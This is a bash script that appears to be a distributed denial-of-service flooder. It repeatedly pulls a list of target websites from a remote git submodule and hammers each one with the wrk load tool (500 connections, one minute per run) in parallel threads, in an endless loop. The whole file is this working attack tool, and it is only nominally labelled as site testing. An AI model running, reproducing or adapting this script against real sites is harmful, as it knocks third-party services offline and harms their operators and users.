#!/bin/bash

TARGET_PATH="$(pwd)/ph_targets/target.txt"

#init target
git submodule init
git submodule update

# get args
while getopts t: flag
do
    case "${flag}" in
        t) TREADS=${OPTARG};
    esac
done

#param check
if [ -z "${TREADS}" ]
then 
	TREADS=4
fi

echo "Start with ${TREADS} threads"
sleep 1

i=0
while : 
do
    # pull targets
    echo "Pull targets"
    cd ./ph_targets/ && git pull &
    wait 

    while [[ $i -ne $TREADS ]]
    do
        while IFS= read -r line
        do
            ((i++))
            echo "i = ${i}"
            echo "Test site: $line"

            wrk -c500 -d1m -t 1 $line  && sleep 1 &

            if [[ $i -eq $TREADS ]]; then
                break
            fi
        done < ${TARGET_PATH}
    done
    wait
    i=0
    echo "End cycle"
done 